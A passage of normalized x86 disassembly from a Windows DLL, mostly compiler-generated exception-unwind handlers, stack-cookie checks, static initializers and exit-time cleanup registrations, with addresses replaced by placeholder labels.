lea eax [ ebp - 0x20 ]
push eax
call sub_10007f1c
retn
sub_10052724
lea ecx [ ebp - 0x18 ]
jmp sub_10007dbd
sub_1005272c
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052747
lea eax [ ebp - 0x28 ]
push eax
call sub_10007f1c
retn
sub_10052751
lea ecx [ ebp - 0x1c ]
jmp sub_10007dbd
sub_10052759
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052774
lea ecx [ ebp - 0x114 ]
jmp sub_10002699
sub_1005277f
lea ecx [ ebp - 0xf8 ]
jmp sub_10002699
sub_1005278a
lea ecx [ ebp - 0x80 ]
jmp sub_10014b74
sub_10052792
lea eax [ ebp - 0x1a0 ]
jmp sub_10002793
sub_1005279d
lea ecx [ ebp - 0xd8 ]
jmp sub_10002699
sub_100527a8
lea esi [ ebp - 0x58 ]
jmp sub_100150b1
sub_100527b0
lea ecx [ ebp - 0x30 ]
jmp sub_10002699
sub_100527b8
lea ecx [ ebp - 0x4c ]
jmp sub_10002699
sub_100527c0
lea ecx [ ebp - 0xd8 ]
jmp sub_10002699
sub_100527cb
lea esi [ ebp - 0xa8 ]
jmp sub_100150b1
sub_100527d6
mov eax [ ebp - 0xb0 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0xb0 ] 0xfffffffe
mov ecx [ ebp - 0xac ]
jmp sub_10002699
sub_100527f8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1a4 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052820
lea eax [ ebp - 0x1a0 ]
jmp sub_10008dca
sub_1005282b
lea ecx [ ebp - 0x16c ]
jmp sub_10001f21
sub_10052836
lea ecx [ ebp - 0x188 ]
jmp sub_10001f21
sub_10052841
lea ecx [ ebp - 0x150 ]
jmp sub_1000af6d
sub_1005284c
lea ecx [ ebp - 0xa8 ]
jmp sub_1000f32a
sub_10052857
lea eax [ ebp - 0x198 ]
jmp sub_10008dca
sub_10052862
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x1a4 ]
mov ecx [ edx - 0x1a8 ]
xor ecx eax
call sub_10027150
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052890
lea ecx [ ebp + 0xa4 ]
jmp sub_10002699
sub_1005289b
lea ecx [ ebp ]
jmp sub_10002699
sub_100528a3
lea ecx [ ebp - 0xa4 ]
jmp sub_10002699
sub_100528ae
lea ecx [ ebp - 0x88 ]
jmp sub_10002699
sub_100528b9
lea ecx [ ebp + 0x88 ]
jmp sub_10002699
sub_100528c4
lea ecx [ ebp + 0xc0 ]
jmp sub_10002699
sub_100528cf
lea eax [ ebp - 0x12c ]
jmp sub_10002793
sub_100528da
lea ecx [ ebp - 0x50 ]
jmp sub_10002699
sub_100528e2
lea ecx [ ebp - 0x6c ]
jmp sub_10002699
sub_100528ea
lea ecx [ ebp + 0x1c ]
jmp sub_10014b74
sub_100528f2
lea esi [ ebp + 0x60 ]
jmp sub_100150b1
sub_100528fa
lea ecx [ ebp - 0x34 ]
jmp sub_10002699
sub_10052902
lea ecx [ ebp + 0xc0 ]
jmp sub_10002699
sub_1005290d
lea ecx [ ebp + 0x44 ]
jmp sub_10002699
sub_10052915
lea ecx [ ebp - 0x34 ]
jmp sub_10002699
sub_1005291d
lea esi [ ebp + 0x60 ]
jmp sub_100150b1
sub_10052925
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x130 ]
xor ecx eax
call sub_10027150
mov ecx [ edx + 0xe8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052950
lea eax [ ebp - 0x24 ]
push eax
call sub_10007f1c
retn
sub_1005295a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052975
lea ecx [ ebp - 0x5c ]
jmp sub_10002699
sub_1005297d
lea ecx [ ebp - 0x94 ]
jmp sub_10002699
sub_10052988
lea ecx [ ebp - 0x3c ]
jmp sub_10014b74
sub_10052990
lea ecx [ ebp - 0x78 ]
jmp sub_10002699
sub_10052998
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100529c0
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_100529c8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100529e3
lea ecx [ ebp - 0xb8 ]
jmp sub_10001f21
sub_100529ee
lea ecx [ ebp - 0x48 ]
jmp sub_10002699
sub_100529f6
lea ecx [ ebp - 0x64 ]
jmp sub_10002699
sub_100529fe
lea ecx [ ebp - 0x9c ]
jmp sub_10002699
sub_10052a09
lea ecx [ ebp - 0xd4 ]
jmp sub_10002699
sub_10052a14
lea ecx [ ebp - 0x78 ]
jmp sub_100192f2
sub_10052a1c
lea ecx [ ebp - 0xb8 ]
jmp sub_10002699
sub_10052a27
lea ecx [ ebp - 0x10c ]
jmp sub_10002699
sub_10052a32
lea ecx [ ebp - 0x128 ]
jmp sub_10002699
sub_10052a3d
lea ecx [ ebp - 0xf0 ]
jmp sub_10002699
sub_10052a48
lea ecx [ ebp - 0x144 ]
jmp sub_10002699
sub_10052a53
lea ecx [ ebp - 0x6c ]
jmp sub_1001939d
sub_10052a5b
lea eax [ ebp - 0x1d8 ]
jmp sub_1000b6e6
sub_10052a66
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_10052a6e
lea ecx [ ebp - 0x9c ]
jmp sub_10001f21
sub_10052a79
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1dc ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052aa1
lea ecx [ ebp - 0x68 ]
jmp sub_10002699
sub_10052aa9
lea ecx [ ebp - 0x4c ]
jmp sub_10002699
sub_10052ab1
lea ecx [ ebp - 0x78 ]
jmp sub_100192c5
sub_10052ab9
lea ecx [ ebp - 0x30 ]
jmp sub_10001f21
sub_10052ac1
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x7c ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_10027150
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052ae9
lea eax [ ebp - 0x5c ]
jmp sub_10001431
sub_10052af1
lea eax [ ebp - 0x44 ]
jmp sub_1000f766
sub_10052af9
lea ecx [ ebp - 0x60 ]
jmp sub_1000f5ca
sub_10052b01
lea ecx [ ebp + 0x90 ]
jmp sub_10002699
sub_10052b0c
lea ecx [ ebp ]
jmp sub_1000f277
sub_10052b14
lea ecx [ ebp + 0x4 ]
jmp sub_10001f21
sub_10052b1c
lea ecx [ ebp + 0x20 ]
jmp sub_10002699
sub_10052b24
lea ecx [ ebp + 0x3c ]
jmp sub_10002699
sub_10052b2c
lea ecx [ ebp + 0x58 ]
jmp sub_10002699
sub_10052b34
lea ecx [ ebp ]
jmp sub_10013c31
sub_10052b3c
lea ecx [ ebp + 0xac ]
jmp sub_10001f21
sub_10052b47
lea ecx [ ebp - 0x7c ]
jmp sub_10001f21
sub_10052b4f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x80 ]
xor ecx eax
call sub_10027150
mov ecx [ edx + 0xd4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052b77
lea ecx [ ebp - 0x14 ]
jmp sub_100200be
sub_10052b7f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052b9a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052bb5
lea ecx [ ebp - 0x54 ]
jmp sub_1000dab4
sub_10052bbd
lea ecx [ ebp - 0x38 ]
jmp sub_10002699
sub_10052bc5
lea ecx [ ebp ]
jmp sub_1000af6d
sub_10052bcd
lea eax [ ebp - 0x34 ]
push eax
call sub_10009555
retn
sub_10052bd7
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_10027150
mov ecx [ edx + 0xb4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052bff
lea eax [ ebp - 0x28 ]
jmp sub_10001431
sub_10052c07
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x24 ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052c22
lea ecx [ ebp - 0x30 ]
jmp sub_10002699
sub_10052c2a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052c4f
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10052c57
lea ecx [ ebp - 0x168 ]
jmp sub_10002699
sub_10052c62
lea ecx [ ebp - 0x168 ]
jmp sub_10002699
sub_10052c6d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x170 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052c95
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10052c9d
lea ecx [ ebp - 0x68 ]
jmp sub_10002699
sub_10052ca5
lea ecx [ ebp - 0x4c ]
jmp sub_10002699
sub_10052cad
lea ecx [ ebp - 0x4c ]
jmp sub_10002699
sub_10052cb5
lea ecx [ ebp - 0x68 ]
jmp sub_10002699
sub_10052cbd
lea ecx [ ebp - 0x4c ]
jmp sub_10002699
sub_10052cc5
lea ecx [ ebp - 0x68 ]
jmp sub_10002699
sub_10052ccd
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052cf2
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10052cfa
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10052d02
lea ecx [ ebp - 0x6c ]
jmp sub_10002699
sub_10052d0a
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10052d12
lea eax [ ebp - 0x108 ]
jmp sub_10002793
sub_10052d1d
lea ecx [ ebp - 0x48 ]
jmp sub_10002699
sub_10052d25
lea eax [ ebp - 0x50 ]
jmp sub_10008dca
sub_10052d2d
lea ecx [ ebp - 0x2c ]
jmp sub_10001f21
sub_10052d35
lea ecx [ ebp - 0x48 ]
jmp sub_10002699
sub_10052d3d
lea ecx [ ebp - 0x6c ]
jmp sub_10002699
sub_10052d45
lea ecx [ ebp - 0x48 ]
jmp sub_10002699
sub_10052d4d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052d75
lea ecx [ ebp - 0x80 ]
jmp sub_10002699
sub_10052d7d
lea ecx [ ebp - 0x64 ]
jmp sub_10002699
sub_10052d85
lea ecx [ ebp - 0x64 ]
jmp sub_10001f21
sub_10052d8d
lea esi [ ebp - 0x38 ]
jmp sub_100150b1
sub_10052d95
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x94 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052dbd
lea ecx [ ebp - 0x78 ]
jmp sub_10002699
sub_10052dc5
lea ecx [ ebp - 0x94 ]
jmp sub_10002699
sub_10052dd0
lea ecx [ ebp - 0x78 ]
jmp sub_10002699
sub_10052dd8
lea ecx [ ebp - 0xbc ]
jmp sub_10014b74
sub_10052de3
lea ecx [ ebp - 0x34 ]
jmp sub_10002699
sub_10052deb
lea ecx [ ebp - 0x34 ]
jmp sub_10002699
sub_10052df3
lea ecx [ ebp - 0x34 ]
jmp sub_10002699
sub_10052dfb
lea esi [ ebp - 0x5c ]
jmp sub_100150b1
sub_10052e03
lea ecx [ ebp - 0x94 ]
jmp sub_10002699
sub_10052e0e
lea ecx [ ebp - 0x50 ]
jmp sub_10002699
sub_10052e16
lea ecx [ ebp - 0x78 ]
jmp sub_10001f21
sub_10052e1e
lea ecx [ ebp - 0x50 ]
jmp sub_10002699
sub_10052e26
lea ecx [ ebp - 0x50 ]
jmp sub_10002699
sub_10052e2e
lea ecx [ ebp - 0x34 ]
jmp sub_10002699
sub_10052e36
lea ecx [ ebp - 0x50 ]
jmp sub_10002699
sub_10052e3e
lea ecx [ ebp - 0x78 ]
jmp sub_10001f21
sub_10052e46
lea ecx [ ebp - 0x50 ]
jmp sub_10002699
sub_10052e4e
lea ecx [ ebp - 0x50 ]
jmp sub_10002699
sub_10052e56
lea ecx [ ebp - 0x50 ]
jmp sub_10002699
sub_10052e5e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xdc ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052e86
lea ecx [ ebp - 0x48 ]
jmp sub_10002699
sub_10052e8e
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10052e96
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10052e9e
lea ecx [ ebp - 0x2d8 ]
jmp sub_10002699
sub_10052ea9
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10052eb1
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10052eb9
lea ecx [ ebp - 0x64 ]
jmp sub_10002699
sub_10052ec1
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10052ec9
lea eax [ ebp - 0x428 ]
jmp sub_10002793
sub_10052ed4
lea eax [ ebp - 0x3a0 ]
jmp sub_10002793
sub_10052edf
lea eax [ ebp - 0x4b0 ]
jmp sub_10002793
sub_10052eea
lea ecx [ ebp - 0x2d8 ]
jmp sub_10002699
sub_10052ef5
lea ecx [ ebp - 0x2f8 ]
jmp sub_10002699
sub_10052f00
lea ecx [ ebp - 0x2f8 ]
jmp sub_10002699
sub_10052f0b
lea ecx [ ebp - 0x2d8 ]
jmp sub_10002699
sub_10052f16
lea ecx [ ebp - 0x2d8 ]
jmp sub_10002699
sub_10052f21
lea ecx [ ebp - 0x2f8 ]
jmp sub_10002699
sub_10052f2c
lea ecx [ ebp - 0x2d8 ]
jmp sub_10002699
sub_10052f37
lea ecx [ ebp - 0x2f8 ]
jmp sub_10002699
sub_10052f42
lea ecx [ ebp - 0x2d8 ]
jmp sub_10002699
sub_10052f4d
lea ecx [ ebp - 0x2f8 ]
jmp sub_10002699
sub_10052f58
lea ecx [ ebp - 0x2d8 ]
jmp sub_10002699
sub_10052f63
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10052f6b
lea ecx [ ebp - 0x2d8 ]
jmp sub_10002699
sub_10052f76
lea ecx [ ebp - 0x64 ]
jmp sub_10002699
sub_10052f7e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4b4 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10052fa6
lea ecx [ ebp - 0x2c0 ]
jmp sub_10002699
sub_10052fb1
lea ecx [ ebp - 0x268 ]
jmp sub_10015974
sub_10052fbc
lea ecx [ ebp - 0x30 ]
jmp sub_10002699
sub_10052fc4
lea ecx [ ebp - 0x288 ]
jmp sub_10002699
sub_10052fcf
lea ecx [ ebp - 0x2a4 ]
jmp sub_10002699
sub_10052fda
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c4 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10053002
lea ecx [ ebp - 0x9c ]
jmp sub_10002699
sub_1005300d
lea ecx [ ebp - 0xd4 ]
jmp sub_10002699
sub_10053018
lea ecx [ ebp - 0x5c ]
jmp sub_10014b74
sub_10053020
lea ecx [ ebp - 0xb8 ]
jmp sub_10002699
sub_1005302b
lea esi [ ebp - 0xfc ]
jmp sub_100150b1
sub_10053036
lea ecx [ ebp - 0x34 ]
jmp sub_10002699
sub_1005303e
lea ecx [ ebp - 0x80 ]
jmp sub_10002699
sub_10053046
lea ecx [ ebp - 0x80 ]
jmp sub_10002699
sub_1005304e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x100 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10053076
lea eax [ ebp - 0xf4 ]
jmp sub_10002793
sub_10053081
lea eax [ ebp - 0x4c ]
jmp sub_10001431
sub_10053089
lea ecx [ ebp - 0x30 ]
jmp sub_10002699
sub_10053091
lea ecx [ ebp - 0x30 ]
jmp sub_10002699
sub_10053099
lea ecx [ ebp - 0x68 ]
jmp sub_10002699
sub_100530a1
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xf8 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100530c9
lea eax [ ebp - 0x3c4 ]
jmp sub_10002793
sub_100530d4
lea ecx [ ebp - 0x180 ]
jmp sub_10002699
sub_100530df
lea ecx [ ebp - 0x33c ]
jmp sub_10002699
sub_100530ea
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x3c8 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10053112
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_1005311a
lea ecx [ ebp - 0x4c ]
jmp sub_10002699
sub_10053122
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10053147
lea ecx [ ebp - 0x94 ]
jmp sub_10002699
sub_10053152
lea ecx [ ebp - 0xb0 ]
jmp sub_10002699
sub_1005315d
lea ecx [ ebp - 0x58 ]
jmp sub_10014b74
sub_10053165
lea ecx [ ebp - 0x78 ]
jmp sub_10002699
sub_1005316d
lea esi [ ebp - 0xf4 ]
jmp sub_100150b1
sub_10053178
lea ecx [ ebp - 0x30 ]
jmp sub_10002699
sub_10053180
lea ecx [ ebp - 0xcc ]
jmp sub_10002699
sub_1005318b
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xf8 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100531b3
lea ecx [ ebp - 0x68 ]
jmp sub_10002699
sub_100531bb
lea esi [ ebp - 0x90 ]
jmp sub_100150b1
sub_100531c6
lea ecx [ ebp - 0x30 ]
jmp sub_10002699
sub_100531ce
lea ecx [ ebp - 0x4c ]
jmp sub_10002699
sub_100531d6
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x94 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100531fe
lea ecx [ ebp - 0x78 ]
jmp sub_10002699
sub_10053206
lea ecx [ ebp - 0x5c ]
jmp sub_10002699
sub_1005320e
lea ecx [ ebp - 0x3c ]
jmp sub_10014b74
sub_10053216
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x7c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1005323b
lea ecx [ ebp - 0x874 ]
jmp sub_10002699
sub_10053246
lea ecx [ ebp - 0x858 ]
jmp sub_10002699
sub_10053251
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x87c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10053279
lea ecx [ ebp - 0x64 ]
jmp sub_10002699
sub_10053281
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10053289
lea ecx [ ebp - 0x48 ]
jmp sub_10002699
sub_10053291
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100532b6
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_100532be
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100532d9
lea ecx [ ebp - 0x78 ]
jmp sub_10002699
sub_100532e1
lea ecx [ ebp - 0x94 ]
jmp sub_10002699
sub_100532ec
lea ecx [ ebp - 0x3c ]
jmp sub_10014b74
sub_100532f4
lea ecx [ ebp - 0x5c ]
jmp sub_10002699
sub_100532fc
lea ecx [ ebp - 0x5c ]
jmp sub_10002699
sub_10053304
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_1005332c
lea eax [ ebp - 0x48 ]
jmp sub_10001431
sub_10053334
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_1005333c
lea ecx [ ebp - 0x64 ]
jmp sub_10002699
sub_10053344
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x68 ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10053369
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10053371
lea ecx [ ebp - 0x48 ]
jmp sub_10002699
sub_10053379
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10053381
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10053389
lea ecx [ ebp - 0x48 ]
jmp sub_10002699
sub_10053391
lea ecx [ ebp - 0x2c ]
jmp sub_10002699
sub_10053399
lea ecx [ ebp - 0x48 ]
jmp sub_10002699
sub_100533a1
lea ecx [ ebp - 0x64 ]
jmp sub_10002699
sub_100533a9
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x6c ]
xor ecx eax
call sub_10027150
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_100533ce
lea ecx [ ebp - 0x160 ]
jmp sub_10002699
sub_100533d9
lea ecx [ ebp - 0x144 ]
jmp sub_10002699
sub_100533e4
lea ecx [ ebp - 0x58 ]
jmp sub_10014b74
sub_100533ec
lea ecx [ ebp - 0x17c ]
jmp sub_10002699
sub_100533f7
lea eax [ ebp - 0x100 ]
jmp sub_10002793
sub_10053402
lea ecx [ ebp - 0x184 ]
jmp sub_10010ea1
sub_1005340d
lea ecx [ ebp - 0x74 ]
jmp sub_10002699
sub_10053415
lea ecx [ ebp - 0x30 ]
jmp sub_10001f21
sub_1005341d
lea ecx [ ebp - 0x17c ]
jmp sub_10002699
sub_10053428
lea esi [ ebp - 0x128 ]
jmp sub_100150b1
sub_10053433
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x18c ]
mov ecx [ edx - 0x190 ]
xor ecx eax
call sub_10027150
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_10027150
mov eax r--data
jmp sub_1002af4d
sub_10053470
call sub_100266e0
mov [ rw-data ] eax
retn
sub_1005347b
call sub_100266e0
mov [ rw-data ] eax
retn
sub_10053486
call sub_10026670
mov [ rw-data ] eax
retn
sub_10053491
call sub_100266e0
mov [ rw-data ] eax
retn
sub_1005349c
call sub_100266e0
mov [ rw-data ] eax
retn
sub_100534a7
call sub_10026670
mov [ rw-data ] eax
retn
sub_100534b2
call sub_100266e0
mov [ rw-data ] eax
retn
sub_100534bd
call sub_100266e0
mov [ rw-data ] eax
retn
sub_100534c8
call sub_10026670
mov [ rw-data ] eax
retn
sub_100534d3
call sub_100266e0
mov [ rw-data ] eax
retn
sub_100534de
call sub_100266e0
mov [ rw-data ] eax
retn
sub_100534e9
call sub_10026670
mov [ rw-data ] eax
retn
sub_10053538
mov ecx rw-data
call sub_10021e2a
push sub_10053680
call sub_1002c1a3
pop ecx
retn
sub_1005354e
push sub_1005368a
call sub_1002c1a3
pop ecx
retn
sub_1005355a
mov ecx rw-data
call sub_10021e2a
push sub_10053694
call sub_1002c1a3
pop ecx
retn
sub_10053570
push sub_1005369e
call sub_1002c1a3
pop ecx
retn
sub_10053580
push sub_100536b0
call sub_1002c1a3
pop ecx
retn
sub_10053590
call sub_10026670
mov [ rw-data ] eax
retn
sub_100535a0
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_100535c0
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_100535e0
call sub_10026670
mov [ rw-data ] 0x3
mov [ rw-data ] eax
retn
sub_10053600
push 0x0
push r--data
mov ecx rw-data
call sub_10025a10
push sub_10053780
call sub_1002c1a3
pop ecx
retn
sub_10053620
push 0x0
push r--data
mov ecx rw-data
call sub_10025a10
push sub_10053740
call sub_1002c1a3
pop ecx
retn
sub_10053640
call sub_100266e0
mov [ rw-data ] eax
retn
sub_10053650
call sub_100266e0
mov [ rw-data ] eax
retn
sub_10053660
call sub_10026670
mov [ rw-data ] eax
retn
sub_10053670
call sub_10026670
mov [ rw-data ] eax
retn
sub_10053680
mov ecx rw-data
jmp sub_10021e5b
sub_1005368a
mov ecx rw-data
jmp sub_10007dbd
sub_10053694
mov ecx rw-data
jmp sub_10021e5b
sub_1005369e
mov ecx rw-data
jmp sub_10023032
sub_10053740
cmp [ rw-data ] 0x8
jb r-xdata
xor ecx ecx
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] cx
retn
mov eax [ rw-data ]
push eax
call sub_100272e8
add esp 0x4
sub_10053780
cmp [ rw-data ] 0x8
jb r-xdata
xor ecx ecx
mov [ rw-data ] 0x7
mov [ rw-data ] 0x0
mov [ rw-data ] cx
retn
mov eax [ rw-data ]
push eax
call sub_100272e8
add esp 0x4
sub_100537c0
mov [ rw-data ] r--data
retn
sub_100537d0
mov [ rw-data ] r--data
retn
sub_100537e0
mov [ rw-data ] r--data
retn
sub_100537f0
cmp [ rw-data ] 0x10
jb r-xdata
xor eax eax
mov [ rw-data ] 0xf
mov [ rw-data ] eax
mov [ rw-data ] al
retn
mov eax [ rw-data ]
push eax
call sub_100272e8
add esp 0x4
sub_1005381e
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_100274ce
sub_10053832
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_100274ce
sub_10053846
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_100274ce
